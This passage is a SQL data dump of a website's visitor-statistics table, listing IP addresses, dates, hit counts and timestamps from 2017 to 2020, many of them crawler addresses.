('::1', '2017-01-25', 12, '1485359750'),
('::1', '2017-01-26', 37, '1485414680'),
('::1', '2017-01-27', 70, '1485508785'),
('::1', '2017-01-28', 1, '1485567010'),
('::1', '2017-02-04', 1, '1486213804'),
('::1', '2017-02-09', 14, '1486659480'),
('::1', '2017-02-10', 3, '1486684650'),
('::1', '2017-02-11', 11, '1486773431'),
('::1', '2017-02-12', 6, '1486869838'),
('::1', '2017-02-13', 5, '1486995163'),
('::1', '2017-02-15', 3, '1487123924'),
('::1', '2017-02-21', 1, '1487659967'),
('::1', '2017-02-23', 7, '1487832476'),
('::1', '2017-02-26', 4, '1488064851'),
('::1', '2017-03-13', 44, '1489366890'),
('::1', '2017-03-17', 24, '1489744337'),
('::1', '2017-03-20', 1, '1489988038'),
('::1', '2017-03-25', 1, '1490413626'),
('::1', '2017-03-29', 7, '1490744633'),
('::1', '2017-04-02', 1, '1491122695'),
('::1', '2017-04-06', 56, '1491462329'),
('::1', '2017-04-07', 59, '1491524075'),
('::1', '2017-04-09', 20, '1491711058'),
('::1', '2017-04-11', 9, '1491877995'),
('::1', '2017-04-12', 124, '1492006218'),
('::1', '2017-04-13', 53, '1492088580'),
('::1', '2017-05-14', 133, '1494767093'),
('::1', '2017-05-20', 167, '1495299592'),
('::1', '2017-05-21', 234, '1495359950'),
('::1', '2018-04-19', 1, '1524111568'),
('::1', '2018-04-21', 1, '1524249582'),
('::1', '2018-04-24', 19, '1524509093'),
('::1', '2018-05-04', 13, '1525441129'),
('::1', '2018-05-05', 36, '1525494921'),
('::1', '2018-05-06', 5, '1525614861'),
('::1', '2018-05-11', 15, '1525998298'),
('::1', '2018-05-18', 4, '1526611139'),
('::1', '2018-05-19', 6, '1526701697'),
('::1', '2018-05-20', 13, '1526833607'),
('::1', '2018-05-22', 13, '1526947912'),
('::1', '2018-05-23', 16, '1527056425'),
('::1', '2018-05-31', 1, '1527743948'),
('::1', '2018-06-01', 2, '1527815549'),
('::1', '2018-06-03', 191, '1528045141'),
('::1', '2018-06-04', 100, '1528127678'),
('::1', '2019-05-18', 28, '1558141438'),
('::1', '2019-06-30', 2, '1561872220'),
('::1', '2019-07-01', 1, '1561950236'),
('::1', '2019-07-02', 1, '1562028708'),
('::1', '2019-07-08', 1, '1562544054'),
('::1', '2019-07-13', 1, '1562978601'),
('::1', '2019-07-14', 243, '1563094093'),
('::1', '2019-07-15', 213, '1563173043'),
('::1', '2019-07-16', 3, '1563231376'),
('::1', '2019-07-17', 9, '1563323606'),
('::1', '2019-07-18', 4, '1563407947'),
('::1', '2019-08-27', 2, '1566889548'),
('::1', '2019-11-14', 100, '1573723243'),
('::1', '2019-11-15', 1, '1573815541'),
('::1', '2019-11-16', 92, '1573912524'),
('::1', '2019-11-17', 14, '1573997167'),
('::1', '2019-11-18', 380, '1574068697'),
('::1', '2019-11-19', 12, '1574148729'),
('::1', '2019-11-20', 5, '1574240913'),
('::1', '2019-11-21', 1, '1574291940'),
('::1', '2019-11-24', 3, '1574552073'),
('::1', '2020-02-09', 3, '1581212463'),
('::1', '2020-07-06', 68, '1594019310'),
('118.136.9.158', '2020-07-06', 39, '1594023205'),
('120.188.75.149', '2020-07-06', 3, '1594021416'),
('2a03:2880:ff:f::face', '2020-07-06', 1, '1594022846'),
('2a03:2880:ff:3::face', '2020-07-06', 1, '1594022847'),
('2a03:2880:ff:1c::fac', '2020-07-06', 1, '1594022848'),
('2a03:2880:ff:78::fac', '2020-07-06', 1, '1594023087'),
('2a03:2880:ff:12::fac', '2020-07-06', 1, '1594023089'),
('2a03:2880:ff:75::fac', '2020-07-06', 1, '1594023090'),
('2a03:2880:ff:10::fac', '2020-07-06', 1, '1594023101'),
('2a03:2880:ff:16::fac', '2020-07-06', 1, '1594023103'),
('2a03:2880:ff:d::face', '2020-07-06', 1, '1594023103'),
('2a03:2880:ff:b::face', '2020-07-06', 1, '1594023170'),
('120.188.82.121', '2020-07-06', 4, '1594051134'),
('107.178.239.207', '2020-07-07', 1, '1594055883'),
('118.136.9.158', '2020-07-07', 234, '1594121286'),
('118.136.9.158', '2020-07-07', 234, '1594121286'),
('2a03:2880:23ff:7::fa', '2020-07-07', 1, '1594096625'),
('2a03:2880:20ff:15::f', '2020-07-07', 1, '1594096626'),
('2a03:2880:ff:9::face', '2020-07-07', 1, '1594100076'),
('2a03:2880:ff:17::fac', '2020-07-07', 1, '1594100078'),
('2a03:2880:ff:78::fac', '2020-07-07', 1, '1594100079'),
('2a03:2880:11ff:77::f', '2020-07-07', 1, '1594100084'),
('2a03:2880:ff:5::face', '2020-07-07', 1, '1594100760'),
('2a03:2880:ff:70::fac', '2020-07-07', 1, '1594100762'),
('2a03:2880:11ff:77::f', '2020-07-07', 1, '1594100766'),
('2a03:2880:ff:6::face', '2020-07-07', 1, '1594101083'),
('2a03:2880:11ff:8::fa', '2020-07-07', 1, '1594101099'),
('2a03:2880:ff::face:b', '2020-07-07', 1, '1594101910'),
('2a03:2880:ff:e::face', '2020-07-07', 1, '1594101912'),
('2a03:2880:ff:1e::fac', '2020-07-07', 1, '1594102270'),
('2a03:2880:ff:1d::fac', '2020-07-07', 1, '1594102298'),
('2a03:2880:ff:5::face', '2020-07-07', 1, '1594102589'),
('2a03:2880:ff:78::fac', '2020-07-07', 1, '1594102591'),
('2a03:2880:ff:6f::fac', '2020-07-07', 1, '1594104410'),
('2a03:2880:ff:9::face', '2020-07-07', 1, '1594104432'),
('2a03:2880:ff:b::face', '2020-07-07', 1, '1594105649'),
('2a03:2880:ff:1::face', '2020-07-07', 1, '1594105651'),
('2a03:2880:ff:15::fac', '2020-07-07', 1, '1594105652'),
('2a03:2880:ff:71::fac', '2020-07-07', 1, '1594105681'),
('2a03:2880:ff:76::fac', '2020-07-07', 1, '1594105683'),
('2a03:2880:ff:76::fac', '2020-07-07', 1, '1594106244'),
('2a03:2880:ff:a::face', '2020-07-07', 1, '1594106246'),
('2a03:2880:ff:6f::fac', '2020-07-07', 1, '1594106247'),
('2a03:2880:11ff:75::f', '2020-07-07', 1, '1594106254'),
('2a03:2880:ff::face:b', '2020-07-07', 1, '1594106925'),
('2a03:2880:ff:1f::fac', '2020-07-07', 1, '1594106926'),
('2a03:2880:ff:15::fac', '2020-07-07', 1, '1594108138'),
('2a03:2880:ff:77::fac', '2020-07-07', 1, '1594108174'),
('2a03:2880:ff:5::face', '2020-07-07', 1, '1594108176'),
('2a03:2880:ff:76::fac', '2020-07-07', 1, '1594108186'),
('2a03:2880:ff:17::fac', '2020-07-07', 1, '1594108715'),
('2a03:2880:ff:20::fac', '2020-07-07', 1, '1594108717'),
('2a03:2880:ff:15::fac', '2020-07-07', 1, '1594108725'),
('2a03:2880:ff:4::face', '2020-07-07', 1, '1594109174'),
('2a03:2880:ff:20::fac', '2020-07-07', 1, '1594109175'),
('2a03:2880:ff:20::fac', '2020-07-07', 1, '1594109772'),
('2a03:2880:ff:20::fac', '2020-07-07', 1, '1594109773'),
('2a03:2880:ff:9::face', '2020-07-07', 1, '1594109982'),
('2a03:2880:ff:78::fac', '2020-07-07', 1, '1594109983'),
('2a03:2880:ff:13::fac', '2020-07-07', 1, '1594109984'),
('2a03:2880:ff:15::fac', '2020-07-07', 1, '1594116153'),
('2a03:2880:ff:1d::fac', '2020-07-07', 1, '1594116155'),
('2a03:2880:ff:1d::fac', '2020-07-07', 1, '1594116155'),
('2a03:2880:ff:c::face', '2020-07-07', 1, '1594116952'),
('2a03:2880:ff:a::face', '2020-07-07', 1, '1594116954'),
('2a03:2880:ff:1f::fac', '2020-07-07', 1, '1594116954'),
('2a03:2880:ff:76::fac', '2020-07-07', 1, '1594117742'),
('2a03:2880:ff:8::face', '2020-07-07', 1, '1594117743'),
('120.188.38.15', '2020-07-07', 3, '1594133566'),
('114.5.244.36', '2020-07-07', 2, '1594140580'),
('2a03:2880:23ff:75::f', '2020-07-08', 1, '1594168269'),
('2a03:2880:13ff:f::fa', '2020-07-08', 1, '1594174920'),
('2a03:2880:13ff:a::fa', '2020-07-08', 1, '1594174920'),
('2a03:2880:13ff:5::fa', '2020-07-08', 1, '1594174920'),
('118.136.9.158', '2020-07-08', 5, '1594183913'),
('2a03:2880:10ff:1f::f', '2020-07-08', 1, '1594181649'),
('35.203.245.176', '2020-07-08', 1, '1594193088'),
('2606:4700:1101:0:7a2', '2020-07-08', 1, '1594194057'),
('172.69.28.168', '2020-07-08', 11, '1594194126'),
('2a03:2880:ff:b::face', '2020-07-08', 1, '1594196114'),
('2a03:2880:ff:1b::fac', '2020-07-08', 1, '1594196119'),
('2a03:2880:12ff:71::f', '2020-07-09', 1, '1594250825'),
('66.249.79.220', '2020-07-09', 3, '1594252083'),
('107.178.239.219', '2020-07-09', 1, '1594268917'),
('2a03:2880:ff:78::fac', '2020-07-09', 1, '1594291534'),
('2a03:2880:11ff:77::f', '2020-07-09', 1, '1594292419'),
('2a03:2880:13ff:74::f', '2020-07-09', 1, '1594304281'),
('66.249.79.206', '2020-07-10', 4, '1594335758'),
('66.249.79.204', '2020-07-10', 33, '1594337054'),
('66.249.79.202', '2020-07-10', 256, '1594337470'),
('2a03:2880:10ff:22::f', '2020-07-10', 1, '1594335772'),
('2a03:2880:10ff:b::fa', '2020-07-10', 1, '1594335774'),
('2a03:2880:10ff:1b::f', '2020-07-10', 1, '1594335774'),
('2a03:2880:10ff:b::fa', '2020-07-10', 1, '1594335784'),
('2a03:2880:20ff:e::fa', '2020-07-10', 1, '1594335784'),
('2a03:2880:20ff:14::f', '2020-07-10', 1, '1594335787'),
('2a03:2880:20ff:1b::f', '2020-07-10', 1, '1594335787'),
('2a03:2880:10ff:1a::f', '2020-07-10', 1, '1594335787'),
('2a03:2880:10ff:1b::f', '2020-07-10', 1, '1594335787'),
('2a03:2880:31ff:e::fa', '2020-07-10', 1, '1594335787'),
('2a03:2880:31ff:c::fa', '2020-07-10', 1, '1594335789'),
('2a03:2880:31ff::face', '2020-07-10', 1, '1594335790'),
('2a03:2880:20ff:74::f', '2020-07-10', 1, '1594335794'),
('2a03:2880:11ff:c::fa', '2020-07-10', 1, '1594335795'),
('2a03:2880:20ff:74::f', '2020-07-10', 1, '1594335796'),
('2a03:2880:20ff:21::f', '2020-07-10', 1, '1594335797'),
('2a03:2880:20ff:13::f', '2020-07-10', 1, '1594335799'),
('2a03:2880:20ff:3::fa', '2020-07-10', 1, '1594335800'),
('2a03:2880:22ff:75::f', '2020-07-10', 1, '1594335810'),
('2a03:2880:22ff:70::f', '2020-07-10', 1, '1594335812'),
('2a03:2880:20ff:1::fa', '2020-07-10', 1, '1594335813'),
('2a03:2880:22ff:17::f', '2020-07-10', 1, '1594335817'),
('2a03:2880:22ff:18::f', '2020-07-10', 1, '1594335819'),
('2a03:2880:13ff:14::f', '2020-07-10', 1, '1594335823'),
('2a03:2880:13ff:f::fa', '2020-07-10', 1, '1594335824'),
('2a03:2880:21ff:3::fa', '2020-07-10', 1, '1594335824'),
('2a03:2880:10ff:71::f', '2020-07-10', 1, '1594335825'),
('2a03:2880:13ff:14::f', '2020-07-10', 1, '1594335825'),
('2a03:2880:13ff:b::fa', '2020-07-10', 1, '1594335825'),
('2a03:2880:13ff:8::fa', '2020-07-10', 1, '1594335825'),
('2a03:2880:10ff:1a::f', '2020-07-10', 1, '1594335826'),
('2a03:2880:21ff:7::fa', '2020-07-10', 1, '1594335826'),
('2a03:2880:13ff:13::f', '2020-07-10', 1, '1594335826'),
('2a03:2880:13ff:4::fa', '2020-07-10', 1, '1594335826'),
('2a03:2880:21ff:23::f', '2020-07-10', 1, '1594335827'),
('2a03:2880:13ff:d::fa', '2020-07-10', 1, '1594335828'),
('2a03:2880:13ff:74::f', '2020-07-10', 1, '1594335829'),
('2a03:2880:22ff:6f::f', '2020-07-10', 1, '1594335835'),
('2a03:2880:22ff:14::f', '2020-07-10', 1, '1594335837'),
('2a03:2880:21ff:1d::f', '2020-07-10', 1, '1594335848'),
('2a03:2880:21ff:9::fa', '2020-07-10', 1, '1594335850'),
('2a03:2880:21ff:74::f', '2020-07-10', 1, '1594335850'),
('2a03:2880:31ff:13::f', '2020-07-10', 1, '1594335851'),
('2a03:2880:31ff:76::f', '2020-07-10', 1, '1594335851'),
('2a03:2880:13ff:2::fa', '2020-07-10', 1, '1594335851'),
('2a03:2880:31ff:12::f', '2020-07-10', 1, '1594335852'),
('2a03:2880:21ff::face', '2020-07-10', 1, '1594335852'),
('2a03:2880:22ff:2::fa', '2020-07-10', 1, '1594335852'),
('2a03:2880:31ff:76::f', '2020-07-10', 1, '1594335852'),
('2a03:2880:31ff:75::f', '2020-07-10', 1, '1594335853'),
('2a03:2880:13ff:78::f', '2020-07-10', 1, '1594335853'),
('2a03:2880:21ff:70::f', '2020-07-10', 1, '1594335854'),
('2a03:2880:21ff:1e::f', '2020-07-10', 1, '1594335854'),
('2a03:2880:22ff::face', '2020-07-10', 1, '1594335854'),
('2a03:2880:31ff:11::f', '2020-07-10', 1, '1594335854'),
('2a03:2880:10ff:75::f', '2020-07-10', 1, '1594335854'),
('2a03:2880:31ff:74::f', '2020-07-10', 1, '1594335855'),
('2a03:2880:10ff:5::fa', '2020-07-10', 1, '1594335855'),
('2a03:2880:10ff:1f::f', '2020-07-10', 1, '1594335856'),
('2a03:2880:13ff:10::f', '2020-07-10', 1, '1594335856'),
('2a03:2880:31ff:1::fa', '2020-07-10', 1, '1594335857'),
('2a03:2880:13ff:6f::f', '2020-07-10', 1, '1594335858'),
('2a03:2880:21ff:8::fa', '2020-07-10', 1, '1594335858'),
('2a03:2880:13ff:13::f', '2020-07-10', 1, '1594335859'),
('2a03:2880:31ff:6::fa', '2020-07-10', 1, '1594335859'),
('2a03:2880:21ff:8::fa', '2020-07-10', 1, '1594335860'),
('2a03:2880:31ff:13::f', '2020-07-10', 1, '1594335861'),
('2a03:2880:21ff:16::f', '2020-07-10', 1, '1594335861'),
('2a03:2880:31ff:f::fa', '2020-07-10', 1, '1594335863'),
('2a03:2880:22ff:1::fa', '2020-07-10', 1, '1594335866'),
('2a03:2880:22ff:a::fa', '2020-07-10', 1, '1594335868'),
('2a03:2880:21ff:15::f', '2020-07-10', 1, '1594335869'),
('2a03:2880:10ff:1d::f', '2020-07-10', 1, '1594335870'),
('2a03:2880:10ff:75::f', '2020-07-10', 1, '1594335872'),
('2a03:2880:13ff:13::f', '2020-07-10', 1, '1594335872'),
('2a03:2880:10ff:8::fa', '2020-07-10', 1, '1594335873'),
('2a03:2880:13ff:b::fa', '2020-07-10', 1, '1594335873'),
('2a03:2880:10ff:3::fa', '2020-07-10', 1, '1594335874'),
('2a03:2880:10ff:10::f', '2020-07-10', 1, '1594335874'),
('2a03:2880:20ff:1d::f', '2020-07-10', 1, '1594335875'),
('2a03:2880:11ff:b::fa', '2020-07-10', 1, '1594335876'),
('2a03:2880:20ff:2::fa', '2020-07-10', 1, '1594335878'),
('2a03:2880:20ff:18::f', '2020-07-10', 1, '1594335878'),
('2a03:2880:21ff:5::fa', '2020-07-10', 1, '1594335879'),
('2a03:2880:13ff:2::fa', '2020-07-10', 1, '1594335879'),
('2a03:2880:31ff:11::f', '2020-07-10', 1, '1594335880'),
('2a03:2880:20ff:1e::f', '2020-07-10', 1, '1594335880'),
('2a03:2880:20ff:70::f', '2020-07-10', 1, '1594335880'),
('2a03:2880:13ff:4::fa', '2020-07-10', 1, '1594335881'),
('2a03:2880:21ff:7::fa', '2020-07-10', 1, '1594335881'),
('2a03:2880:31ff:d::fa', '2020-07-10', 1, '1594335881'),
('2a03:2880:21ff:78::f', '2020-07-10', 1, '1594335882'),
('2a03:2880:13ff:2::fa', '2020-07-10', 1, '1594335882'),
('2a03:2880:31ff:76::f', '2020-07-10', 1, '1594335882'),
('2a03:2880:21ff:74::f', '2020-07-10', 1, '1594335888'),
('2a03:2880:ff:18::fac', '2020-07-10', 1, '1594335888'),
('2a03:2880:21ff:74::f', '2020-07-10', 1, '1594335889'),
('2a03:2880:21ff:7::fa', '2020-07-10', 1, '1594335890'),
('2a03:2880:31ff:74::f', '2020-07-10', 1, '1594335892'),
('2a03:2880:10ff:b::fa', '2020-07-10', 1, '1594335893'),
('2a03:2880:31ff:f::fa', '2020-07-10', 1, '1594335894'),
('2a03:2880:13ff:14::f', '2020-07-10', 1, '1594335894'),
('2a03:2880:20ff:18::f', '2020-07-10', 1, '1594335894'),
('2a03:2880:10ff:78::f', '2020-07-10', 1, '1594335895'),
('2a03:2880:10ff:2::fa', '2020-07-10', 1, '1594335895'),
('2a03:2880:13ff:71::f', '2020-07-10', 1, '1594335896'),
('2a03:2880:13ff:2::fa', '2020-07-10', 1, '1594335897'),
('2a03:2880:20ff:1f::f', '2020-07-10', 1, '1594335897'),
('2a03:2880:31ff:77::f', '2020-07-10', 1, '1594335899'),
('2a03:2880:21ff:70::f', '2020-07-10', 1, '1594335899'),
('2a03:2880:31ff:77::f', '2020-07-10', 1, '1594335901'),
('2a03:2880:21ff:11::f', '2020-07-10', 1, '1594335901'),
('2a03:2880:31ff:77::f', '2020-07-10', 1, '1594335901'),
('2a03:2880:31ff:76::f', '2020-07-10', 1, '1594335902'),
('2a03:2880:20ff:1e::f', '2020-07-10', 1, '1594335903'),
('2a03:2880:31ff:76::f', '2020-07-10', 1, '1594335904'),
('2a03:2880:20ff:6::fa', '2020-07-10', 1, '1594335904'),
('2a03:2880:21ff:c::fa', '2020-07-10', 1, '1594335905'),
('2a03:2880:31ff:16::f', '2020-07-10', 1, '1594335906'),
('2a03:2880:21ff::face', '2020-07-10', 1, '1594335908'),
('2a03:2880:21ff:1::fa', '2020-07-10', 1, '1594335908'),
('2a03:2880:21ff:17::f', '2020-07-10', 1, '1594335910'),
('2a03:2880:21ff:18::f', '2020-07-10', 1, '1594335911'),
('2a03:2880:31ff:12::f', '2020-07-10', 1, '1594335911'),
('2a03:2880:21ff:74::f', '2020-07-10', 1, '1594335912'),
('2a03:2880:31ff::face', '2020-07-10', 1, '1594335913'),
('2a03:2880:21ff:6f::f', '2020-07-10', 1, '1594335915'),
('2a03:2880:10ff:1d::f', '2020-07-10', 1, '1594335918'),
('2a03:2880:21ff:1b::f', '2020-07-10', 1, '1594335918'),
('2a03:2880:21ff:19::f', '2020-07-10', 1, '1594335918'),
('2a03:2880:10ff:1d::f', '2020-07-10', 1, '1594335919'),
('2a03:2880:10ff:1d::f', '2020-07-10', 1, '1594335920'),
('2a03:2880:10ff::face', '2020-07-10', 1, '1594335921'),
('2a03:2880:10ff:9::fa', '2020-07-10', 1, '1594335922'),
('2a03:2880:13ff::face', '2020-07-10', 1, '1594335929'),
('2a03:2880:31ff:3::fa', '2020-07-10', 1, '1594335930'),
('2a03:2880:13ff:78::f', '2020-07-10', 1, '1594335930'),
('2a03:2880:13ff:74::f', '2020-07-10', 1, '1594335930'),
('2a03:2880:13ff:70::f', '2020-07-10', 1, '1594335931'),
('2a03:2880:13ff:6f::f', '2020-07-10', 1, '1594335932'),
('2a03:2880:31ff:6::fa', '2020-07-10', 1, '1594335933'),
('2a03:2880:22ff:15::f', '2020-07-10', 1, '1594335933'),
('2a03:2880:22ff:4::fa', '2020-07-10', 1, '1594335935'),
('2a03:2880:21ff:7::fa', '2020-07-10', 1, '1594335937'),
('2a03:2880:21ff:17::f', '2020-07-10', 1, '1594335939'),
('2a03:2880:13ff:d::fa', '2020-07-10', 1, '1594335940'),
('2a03:2880:21ff::face', '2020-07-10', 1, '1594335940'),
('2a03:2880:13ff:4::fa', '2020-07-10', 1, '1594335941'),
('2a03:2880:21ff:18::f', '2020-07-10', 1, '1594335941'),
('2a03:2880:10ff:16::f', '2020-07-10', 1, '1594335943'),
('2a03:2880:10ff:15::f', '2020-07-10', 1, '1594335944'),
('2a03:2880:13ff:d::fa', '2020-07-10', 1, '1594335951'),
('2a03:2880:13ff:70::f', '2020-07-10', 1, '1594335952'),
('2a03:2880:20ff:20::f', '2020-07-10', 1, '1594335952'),
('2a03:2880:13ff:a::fa', '2020-07-10', 1, '1594335953'),
('2a03:2880:20ff:11::f', '2020-07-10', 1, '1594335954'),
('2a03:2880:20ff:14::f', '2020-07-10', 1, '1594335955'),
('2a03:2880:10ff:c::fa', '2020-07-10', 1, '1594335958'),
('2a03:2880:10ff:17::f', '2020-07-10', 1, '1594335959'),
('2a03:2880:10ff:1f::f', '2020-07-10', 1, '1594335960'),
('2a03:2880:10ff:3::fa', '2020-07-10', 1, '1594335961'),
('2a03:2880:10ff:1c::f', '2020-07-10', 1, '1594335963'),
('2a03:2880:21ff:70::f', '2020-07-10', 1, '1594335975'),
('2a03:2880:21ff:2::fa', '2020-07-10', 1, '1594335977'),
('2a03:2880:10ff:f::fa', '2020-07-10', 1, '1594335983'),
('2a03:2880:10ff:76::f', '2020-07-10', 1, '1594335985'),
('2a03:2880:10ff:16::f', '2020-07-10', 1, '1594335986'),
('2a03:2880:22ff:76::f', '2020-07-10', 1, '1594335996'),
('2a03:2880:13ff:77::f', '2020-07-10', 1, '1594335998'),
('2a03:2880:22ff:71::f', '2020-07-10', 1, '1594335998'),
('2a03:2880:20ff:4::fa', '2020-07-10', 1, '1594335999'),
('2a03:2880:13ff:1::fa', '2020-07-10', 1, '1594336000'),
('2a03:2880:20ff:1b::f', '2020-07-10', 1, '1594336000'),
('2a03:2880:13ff:76::f', '2020-07-10', 1, '1594336000'),
('2a03:2880:13ff:1::fa', '2020-07-10', 1, '1594336002'),
('2a03:2880:13ff:d::fa', '2020-07-10', 1, '1594336003'),
('2a03:2880:31ff:77::f', '2020-07-10', 1, '1594336003'),
('2a03:2880:31ff:15::f', '2020-07-10', 1, '1594336005'),
('2a03:2880:30ff:6::fa', '2020-07-10', 1, '1594336009'),
('2a03:2880:13ff:7::fa', '2020-07-10', 1, '1594336028'),
('2a03:2880:13ff:16::f', '2020-07-10', 1, '1594336029'),
('2a03:2880:13ff:4::fa', '2020-07-10', 1, '1594336032'),
('2a03:2880:13ff:6f::f', '2020-07-10', 1, '1594336033'),
('2a03:2880:13ff:78::f', '2020-07-10', 1, '1594336037'),
('2a03:2880:13ff:1::fa', '2020-07-10', 1, '1594336038'),
('2a03:2880:31ff:7::fa', '2020-07-10', 1, '1594336043'),
('2a03:2880:20ff:5::fa', '2020-07-10', 1, '1594336044'),
('2a03:2880:31ff:74::f', '2020-07-10', 1, '1594336045'),
('2a03:2880:20ff:76::f', '2020-07-10', 1, '1594336046'),
('2a03:2880:31ff:10::f', '2020-07-10', 1, '1594336095'),
('2a03:2880:31ff:d::fa', '2020-07-10', 1, '1594336097'),
('2a03:2880:22ff:19::f', '2020-07-10', 1, '1594336196'),
('2a03:2880:22ff:14::f', '2020-07-10', 1, '1594336198'),
('2a03:2880:10ff:17::f', '2020-07-10', 1, '1594336439'),
('2a03:2880:10ff:78::f', '2020-07-10', 1, '1594336441'),
('2a03:2880:31ff:7::fa', '2020-07-10', 1, '1594336444'),
('2a03:2880:31ff:d::fa', '2020-07-10', 1, '1594336475'),
('2a03:2880:31ff:74::f', '2020-07-10', 1, '1594336477'),
('2a03:2880:31ff:16::f', '2020-07-10', 1, '1594336477'),
('2a03:2880:13ff:11::f', '2020-07-10', 1, '1594336519'),
('2a03:2880:13ff:7::fa', '2020-07-10', 1, '1594336520'),
('2a03:2880:10ff:3::fa', '2020-07-10', 1, '1594336547'),
('2a03:2880:10ff:20::f', '2020-07-10', 1, '1594336548'),
('2a03:2880:10ff:14::f', '2020-07-10', 1, '1594336550'),
('2a03:2880:21ff:f::fa', '2020-07-10', 1, '1594336585'),
('2a03:2880:21ff:4::fa', '2020-07-10', 1, '1594336587'),
('2a03:2880:21ff:10::f', '2020-07-10', 1, '1594336588'),
('66.249.79.220', '2020-07-10', 6, '1594336713'),
('66.249.79.222', '2020-07-10', 7, '1594338500'),
('2a03:2880:30ff:14::f', '2020-07-10', 1, '1594336631'),
('2a03:2880:32ff:13::f', '2020-07-10', 1, '1594336641'),
('2a03:2880:31ff:f::fa', '2020-07-10', 1, '1594336970'),
('2a03:2880:13ff:5::fa', '2020-07-10', 1, '1594336997'),
('2a03:2880:31ff:b::fa', '2020-07-10', 1, '1594336998'),
('2a03:2880:13ff:10::f', '2020-07-10', 1, '1594336998'),
('2a03:2880:13ff:6f::f', '2020-07-10', 1, '1594336999'),
('2a03:2880:31ff:e::fa', '2020-07-10', 1, '1594337010'),
('2a03:2880:20ff:78::f', '2020-07-10', 1, '1594337045'),
('2a03:2880:13ff:6f::f', '2020-07-10', 1, '1594337083'),
('2a03:2880:10ff:71::f', '2020-07-10', 1, '1594337113'),
('2a03:2880:20ff:17::f', '2020-07-10', 1, '1594337121'),
('2a03:2880:10ff:19::f', '2020-07-10', 1, '1594337644'),
('2a03:2880:31ff:a::fa', '2020-07-10', 1, '1594337669'),
('2a03:2880:11ff:10::f', '2020-07-10', 1, '1594337677'),
('2a03:2880:31ff:e::fa', '2020-07-10', 1, '1594337682'),
('2a03:2880:10ff:f::fa', '2020-07-10', 1, '1594338206'),
('2a03:2880:32ff:e::fa', '2020-07-10', 1, '1594338213'),
('2a03:2880:31ff:75::f', '2020-07-10', 1, '1594338215'),
('2a03:2880:32ff:e::fa', '2020-07-10', 1, '1594338228'),
('2a03:2880:10ff:1f::f', '2020-07-10', 1, '1594338606'),
('2a03:2880:31ff:14::f', '2020-07-10', 1, '1594338610'),
('2a03:2880:31ff:12::f', '2020-07-10', 1, '1594338711'),
('2a03:2880:30ff:17::f', '2020-07-10', 1, '1594338718'),
('2a03:2880:20ff:74::f', '2020-07-10', 1, '1594339342'),
('2a03:2880:21ff:1::fa', '2020-07-10', 1, '1594339360'),
('2a03:2880:21ff:1e::f', '2020-07-10', 1, '1594339729'),
('2a03:2880:31ff:14::f', '2020-07-10', 1, '1594339733'),
('2a03:2880:30ff:74::f', '2020-07-10', 1, '1594341228'),
('2a03:2880:30ff:71::f', '2020-07-10', 1, '1594341238'),
('112.215.170.187', '2020-07-10', 1, '1594341644'),
('2a03:2880:10ff:3::fa', '2020-07-10', 1, '1594343556'),
('2a03:2880:31ff:16::f', '2020-07-10', 1, '1594343562'),
('2a03:2880:21ff:b::fa', '2020-07-10', 1, '1594344907'),
('2a03:2880:20ff:1a::f', '2020-07-10', 1, '1594344913'),
('2a03:2880:10ff:1f::f', '2020-07-10', 1, '1594345186'),
('2a03:2880:32ff:70::f', '2020-07-10', 1, '1594347528'),
('66.249.79.194', '2020-07-10', 2, '1594348710'),
('2a03:2880:22ff:3::fa', '2020-07-10', 1, '1594348807'),
('2a03:2880:10ff:12::f', '2020-07-10', 1, '1594352288'),
('2a03:2880:31ff:2::fa', '2020-07-10', 1, '1594352293'),
('2a03:2880:31ff:4::fa', '2020-07-10', 1, '1594352295'),
('2a03:2880:21ff:1d::f', '2020-07-10', 1, '1594353327'),
('2a03:2880:22ff:71::f', '2020-07-10', 1, '1594353333'),
('2a03:2880:22ff:10::f', '2020-07-10', 1, '1594353335'),
('2a03:2880:10ff:1b::f', '2020-07-10', 1, '1594353947'),
('2a03:2880:11ff:a::fa', '2020-07-10', 1, '1594353955'),
('2a03:2880:11ff:6::fa', '2020-07-10', 1, '1594353958'),
('66.249.72.61', '2020-07-10', 2, '1594359381'),
('2a03:2880:20ff:10::f', '2020-07-10', 1, '1594360253'),
('2a03:2880:20ff:c::fa', '2020-07-10', 1, '1594360264'),
('2a03:2880:20ff:5::fa', '2020-07-10', 1, '1594360265'),
('114.4.83.36', '2020-07-10', 1, '1594361421'),
('2a03:2880:11ff:9::fa', '2020-07-10', 1, '1594361427'),
('2a03:2880:11ff:d::fa', '2020-07-10', 1, '1594361429'),
('140.213.73.94', '2020-07-10', 1, '1594362203'),
('2a03:2880:11ff:12::f', '2020-07-10', 1, '1594362210'),
('2a03:2880:30ff:14::f', '2020-07-10', 1, '1594362261'),
('2a03:2880:22ff:d::fa', '2020-07-10', 1, '1594362273'),
('2a03:2880:22ff:d::fa', '2020-07-10', 1, '1594362274'),
('66.249.72.44', '2020-07-10', 2, '1594362534'),
('66.249.72.63', '2020-07-10', 3, '1594365621'),
('43.252.158.25', '2020-07-10', 1, '1594362970'),
('120.188.80.80', '2020-07-10', 1, '1594367165'),
('2a03:2880:20ff:1c::f', '2020-07-10', 1, '1594368010'),
('2a03:2880:21ff:78::f', '2020-07-10', 1, '1594368021'),
('2a03:2880:21ff:78::f', '2020-07-10', 1, '1594368022'),
('2a03:2880:11ff:1::fa', '2020-07-10', 1, '1594369500'),
('140.213.153.145', '2020-07-10', 1, '1594375232'),
('2a03:2880:20ff:77::f', '2020-07-10', 1, '1594375704'),
('36.71.75.204', '2020-07-10', 1, '1594381852'),
('2a03:2880:10ff:19::f', '2020-07-10', 1, '1594381868'),
('2a03:2880:10ff:1::fa', '2020-07-10', 1, '1594381870'),
('2a03:2880:ff::face:b', '2020-07-10', 1, '1594382268'),
('2a03:2880:ff:e::face', '2020-07-10', 1, '1594382268'),
('2a03:2880:11ff:7::fa', '2020-07-10', 1, '1594388461'),
('114.142.172.18', '2020-07-10', 1, '1594389885'),
('182.1.11.166', '2020-07-10', 1, '1594391362'),
('2a03:2880:ff:13::fac', '2020-07-10', 1, '1594391370'),
('2a03:2880:ff:75::fac', '2020-07-10', 1, '1594391371'),
('125.161.67.206', '2020-07-10', 1, '1594392931'),
('2a03:2880:ff:6f::fac', '2020-07-10', 1, '1594395498'),
('2a03:2880:31ff::face', '2020-07-11', 1, '1594400948'),
('2a03:2880:31ff:78::f', '2020-07-11', 1, '1594400963'),
('2a03:2880:31ff::face', '2020-07-11', 1, '1594400966'),
('35.203.252.125', '2020-07-11', 1, '1594409088'),
('2a03:2880:10ff:77::f', '2020-07-11', 1, '1594414060'),
('2a03:2880:ff:74::fac', '2020-07-11', 1, '1594414613'),
